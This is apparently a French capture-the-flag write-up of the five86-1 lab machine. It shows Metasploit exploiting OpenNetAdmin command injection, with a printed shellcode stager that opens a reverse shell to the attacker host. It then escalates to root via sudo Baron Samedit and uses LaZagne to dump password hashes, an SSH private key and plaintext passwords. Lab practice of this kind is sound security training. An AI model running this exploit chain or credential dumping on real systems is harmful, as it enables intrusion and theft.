1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.150
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.150...100%
[+] Scan Nmap 192.168.56.150...100%
 
[+] 80/tcp open
[+] 22/tcp open
[+] 10000/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.150-tcp.html     |
==========================================================
```

&nbsp;

OpenNetAdmin

![Capture du 2025-03-14 18-22-14.png](../../_resources/Capture%20du%202025-03-14%2018-22-14.png)

&nbsp;

**<span style="color: #dddddd;">💥</span> Metasploit - OpenNetAdmin**

La version de OpenNetAdmin présente une faille d’injection de commande qui me permet d’avoir un shell

```
[msf](Jobs:0 Agents:0) exploit(unix/webapp/opennetadmin_ping_cmd_injection) >> set lhost 192.168.56.149
lhost => 192.168.56.149
[msf](Jobs:0 Agents:0) exploit(unix/webapp/opennetadmin_ping_cmd_injection) >> set rhosts 192.168.56.150
rhosts => 192.168.56.150
[msf](Jobs:0 Agents:0) exploit(unix/webapp/opennetadmin_ping_cmd_injection) >> set verbose true
verbose => true
[msf](Jobs:0 Agents:0) exploit(unix/webapp/opennetadmin_ping_cmd_injection) >> run
[*] Started reverse TCP handler on 192.168.56.149:4444 
[*] Exploiting...
[*] Generated command stager: ["printf '\\177\\105\\114\\106\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\2\\0\\76\\0\\1\\0\\0\\0\\170\\0\\100\\0\\0\\0\\0\\0\\100\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\100\\0\\70\\0\\1\\0\\0\\0\\0\\0\\0\\0\\1\\0\\0\\0\\7\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\100\\0\\0\\0\\0\\0\\0\\0\\100\\0\\0\\0\\0\\0\\372\\0\\0\\0\\0\\0\\0\\0\\174\\1\\0\\0\\0\\0\\0\\0\\0\\20\\0\\0\\0\\0\\0\\0\\61\\377\\152\\11\\130\\231\\266\\20\\110\\211\\326\\115\\61\\311\\152\\42\\101\\132\\152\\7\\132\\17\\5\\110\\205\\300\\170\\121\\152\\12\\101\\131\\120\\152\\51\\130\\231\\152\\2\\137\\152\\1\\136\\17\\5\\110\\205\\300\\170\\73\\110\\227\\110\\271\\2\\0\\21\\134\\300\\250\\70\\225\\121\\110\\211\\346\\152\\20\\132\\152\\52\\130\\17\\5\\131\\110\\205\\300\\171\\45\\111\\377\\311\\164\\30\\127\\152\\43\\130\\152\\0\\152\\5\\110\\211\\347\\110\\61\\366\\17\\5\\131\\131\\137\\110\\205\\300\\171\\307\\152\\74\\130\\152\\1\\137\\17\\5\\136\\152\\176\\132\\17\\5\\110\\205\\300\\170\\355\\377\\346'>>/tmp/iSRId ; chmod +x /tmp/iSRId ; /tmp/iSRId ; rm -f /tmp/iSRId"]
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045380 bytes) to 192.168.56.150
[*] Meterpreter session 1 opened (192.168.56.149:4444 -> 192.168.56.150:46848) at 2025-03-14 18:20:11 +0100

[*] Command Stager progress - 100.00% done (811/811 bytes)

(Meterpreter 1)(/opt/ona/www) >
```

&nbsp;

**<span style="color: #dddddd;">🤖</span> Linpeas**

Hash de l’utilisateur `douglas` trouver dans `/var/www/.htpasswd ` 

```
www-data@five86-1:/tmp$ sh linpeas.sh

╔══════════╣ Analyzing Htpasswd Files (limit 70)  
-rw-r--r-- 1 root root 202 Jan 1 2020 /var/www/.htpasswd  
douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1
```

&nbsp;

Voyons les élévation de privilège

```
╔══════════╣ Executing Linux Exploit Suggester  
╚[+] [CVE-2021-3156] sudo Baron Samedit

&nbsp;  Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt  
   Exposure: less probable  
   Tags: mint=19,ubuntu=18|20, debian=10  
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
```

&nbsp;

&nbsp;**<span style="color: #dddddd;">💀</span> Metasploit - sudo Baron Samedit**

Test de l’exploit trouver précédemment

```
[msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> set lhost 192.168.56.149
lhost => 192.168.56.149
[msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> set session 1
session => 1
[msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> set verbose true
verbose => true
[msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> run
[*] Started reverse TCP handler on 192.168.56.149:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. sudo 1.8.27 is a vulnerable build.
[*] Using automatically selected target: Debian 10 x64 (sudo v1.8.27, libc v2.28)
[*] Using 'python' to run exploit
[*] Writing '/tmp/cFjfob.py' (763 bytes) ...
[*] Creating directory /tmp/libnss_rp8PC
[*] /tmp/libnss_rp8PC created
[*] Writing '/tmp/libnss_rp8PC/f .so.2' (548 bytes) ...
[*] Running python /tmp/cFjfob.py 64 49 60 214 rp8PC/f /tmp
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045380 bytes) to 192.168.56.150
[+] Deleted /tmp/cFjfob.py
[+] Deleted /tmp/libnss_rp8PC/f .so.2
[+] Deleted /tmp/libnss_rp8PC
[*] Meterpreter session 2 opened (192.168.56.149:4444 -> 192.168.56.150:46850) at 2025-03-14 19:02:49 +0100

(Meterpreter 2)(/tmp) > getuid
Server username: root

```

&nbsp;

**<span style="color: #dddddd;">👾</span> LaZagne**

Voyons si lazagne trouve des mot de passe

```
root@five86-1:/tmp/LaZagne-2.4.6/Linux# python3 laZagne.py all
python3 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: jen
Hash: $6$oUJMVFRFI4qds92b$FIP4hsXcnEa2sHT/NyVnxi/PeMc9Kc5r7Sd/dNGyWW.7OS6nz6OinTyPAaQf5h6oxYDNz/7Cex0Gyo5EJ9OPo0:18261:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$GEXLROFsH4hFOtgc$2yAqzTpsmPu8FsfKNi2VZp4K5bA/mWS2hZetUFpuEHetgzz6GsyEcLbuDbWdroHPaC.AwSGBFTYZz0LQjj0Of.:18262:0:99999:7:::

[+] Hash found !!!
Login: moss
Hash: $6$ZKX2L7fJTvFO2Ved$qrJBD8SErjEjIeT.KIqmvgENAnjTQH6mCyQMLey7aMn31uiD0szjhrq8EL6gnJkK5sHzxHEHGyJqbiwI6iUHx0:18262:0:99999:7:::

[+] Hash found !!!
Login: douglas
Hash: $6$XyRmT1iTa7FHKynm$qYVWeN85.Yaj7IpMrt0flV221BCj5WhZeCBsqryZo/DgoP/GEyekTZ6s.Q.N3lJfaiwnT5SxlWxm6m59Lg4d91:18263:0:99999:7:::

[+] Hash found !!!
Login: roy
Hash: $6$Uh0q/F52PTqJQrvA$VDzEEwsd.6PiGP44dBVDbMj10IjIrCdB0qg.e36A0cW24jSVtB3PcD6YokG57hZxLs89Fx0NvWlN63.uMaac./:18261:0:99999:7:::

[+] Hash found !!!
Login: richmond
Hash: $6$9ezwkGRwZkwCcNVu$xSeVVsn7c6jN3DwygvTqS7BT1QNjFemNVEwb6pZNCu3V2IvjUcMULhxgZ67Y/KfVSpfvoWi5Q/6fTMP9nRLty1:18261:0:99999:7:::

------------------- Ssh passwords -----------------

KEY: -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxwd1+1Jum3rz19Ai5NTpMbuV27HAAVqGXW/jYriyXzMZBGLVb/3v
c+v/b3N0nYdAmjHi1jnBnJON/KHmqK39etaXQ3EKoSRH3kD+8myHCn5dFQRTjNpI8PL8OK
Sk0V6R+nk2iFJJzEQl+S/IPFqsh12Wb0vHvbMfFGhdYueiEuZX5OvLGxg0tv7fnnluR724
DnWJ77JoF+mAkMMzVJVcgDZLaVKvs2tVGP81m7CoqrBWiC9HjR+8B2SX4fkCU+42eOdN3n
/ufZZtgFkfYL4h9wj5AyveqxE/NqD30Qt3hZ97RWSU7DaAgN+stPy6tMdlfsdFZ+qcziIT
f+BFpj09UwAAA8iXMwXDlzMFwwAAAAdzc2gtcnNhAAABAQDHB3X7Um6bevPX0CLk1Okxu5
XbscABWoZdb+NiuLJfMxkEYtVv/e9z6/9vc3Sdh0CaMeLWOcGck438oeaorf161pdDcQqh
JEfeQP7ybIcKfl0VBFOM2kjw8vw4pKTRXpH6eTaIUknMRCX5L8g8WqyHXZZvS8e9sx8UaF
1i56IS5lfk68sbGDS2/t+eeW5HvbgOdYnvsmgX6YCQwzNUlVyANktpUq+za1UY/zWbsKiq
sFaIL0eNH7wHZJfh+QJT7jZ4503ef+59lm2AWR9gviH3CPkDK96rET82oPfRC3eFn3tFZJ
TsNoCA36y0/Lq0x2V+x0Vn6pzOIhN/4EWmPT1TAAAAAwEAAQAAAQEAu6cmLzqufLv1crKU
Y8r2v2RNTCGQlfYjH6/h5W+dBjNoUAFbmkcDYPnPEeb6uZgPahLE/BTinl1lDyAbGUlK6G
mxnu3TBtHtTPldJ3b58APqgWld2Tzqbvu6oTFjEOCopE9rAicL26MZZpQNqBIZ/1tW/kKl
5g8fq58nBZy97DBFzzVy60zGyd4mcHqFgXV68Q+8H99Dv738+p09Wt1jisofcBEsIYp9vq
2OEmfNVxDOvwPuWb9HVtJ3gebkaq/HcdL4ExfZbSEZhFJBgBej8rcM+2dvRGVVu4XL0Kuz
6HVv1sc0iPn1tRalKobUtiIRYSCrgYs+RUkJO7HmvvA1eQAAAIBY4u98CMs3Vs3u0pPq70
zlrCoTOV/U3aBB3wyAwoOK4M6j7U1kawPCFE977E/CQkn6oXSaBypcbzIrgmTntDwpN172
cC4u/cvXPGevsa7Ib3jOWAq0V089ilbwmXA/TW2lkSsKaFlSWMqgTMqHrgd3v2dSo537nl
/6g1OG2pr0YgAAAIEA7cHuNvC4cvZUjIWE0C+U+mJwCFKOqmiU+QxMkEeEUhcXSvc/lHMm
nL/O2yjgLwoTSEVia1MV+lkxTRlmUdyVZJnMUXI9rGlE6XQJy4B+2ckqWZnKFS6N53A9TU
IhNP82SjAo1sQZlKGob3X4DjmMLb6UOZVtQrfcfVXhtFIllV0AAACBANZM0kJRRy8yDRi3
RJgULYMRJ0d9O5bxlPuvQnsYdOwqfzaxd+AyrDT19nwl1oVS2UuxrS5u9DqsE2f/lhKlAq
DaawALKfDSpUSax72P+dyYsmOgVT5Qw7/X8OZPj/X4VWltRIudka4/sCwcKckmrHO7d8ew
kmyImLni1n2atcJvAAAAEGRvdWdsYXNAZml2ZTg2LTEBAg==
-----END OPENSSH PRIVATE KEY-----

User: douglas


[+] 7 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.06818675994873047
```

&nbsp;

Mot de passe de utilisateur `moss` trouver dans un fichier

```
root@five86-1:/home/roy# cat dead.letter

I had to change Moss's password earlier today, so when Moss is back on Monday morning, can you tell him that his password is now Fire!Fire!
```

&nbsp;

Identifiant trouver

| Users | Passwords |
| --- | --- |
| moss | Fire!Fire! |
| douglas | fatherrrrr |